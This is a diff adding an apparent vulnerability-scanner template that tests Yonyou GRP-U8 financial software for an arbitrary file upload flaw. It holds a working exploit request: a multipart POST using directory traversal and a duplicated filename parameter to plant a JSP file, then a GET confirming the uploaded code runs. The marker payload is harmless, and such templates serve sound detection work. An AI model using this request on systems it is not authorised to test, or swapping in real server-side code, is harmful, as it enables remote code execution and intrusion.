@@ -1,0 +1,54 @@
+id: yonyou-grp-u8-file-upload
+
+info:
+  name: Yonyou GRP-U8 File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Yonyou GRP-U8 Financial Management Software contains an arbitrary file upload vulnerability. An attacker can upload malicious files to execute arbitrary code or gain system access.
+  tags: file-upload
+
+variables:
+  file_name: "{{rand_hex(4)}}"
+  file_content: "<%out.print(\"{{rand_base(10)}}\");%>"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/UploadFileData?action=upload_file&foldername=%2e%2e%2f&filename={{file_name}}.jsp&filename=1.jpg"
+    headers:
+      Content-Type: multipart/form-data
+    body: |
+      ------WebKitFormBoundary92pUawKc
+      Content-Disposition: form-data; name="myFile";filename="test.jpg"
+
+      {{file_content}}
+      ------WebKitFormBoundary92pUawKc--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "parent.showSucceedMsg();"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/R9iPortal/{{file_name}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{file_content}}"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "/R9iPortal/{{file_name}}\\.jsp"
